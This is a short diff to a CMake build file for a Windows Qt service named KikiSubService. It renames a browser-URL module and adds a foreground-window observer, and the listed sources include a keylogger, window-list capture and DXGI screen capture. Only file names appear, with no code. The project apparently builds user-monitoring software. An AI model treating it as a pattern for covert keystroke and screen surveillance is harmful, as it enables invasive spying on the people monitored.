@@ -19,8 +19,10 @@ qt_add_executable(KikiSubService WIN32
     src/activityprobe.h
     src/windowlistcapture.cpp
     src/windowlistcapture.h
-    src/browserurlprobe.cpp
-    src/browserurlprobe.h
+    src/browserurlreader.cpp
+    src/browserurlreader.h
+    src/foregroundobserver.cpp
+    src/foregroundobserver.h
     src/keylogger.cpp
     src/keylogger.h
     src/dxgicapture.cpp
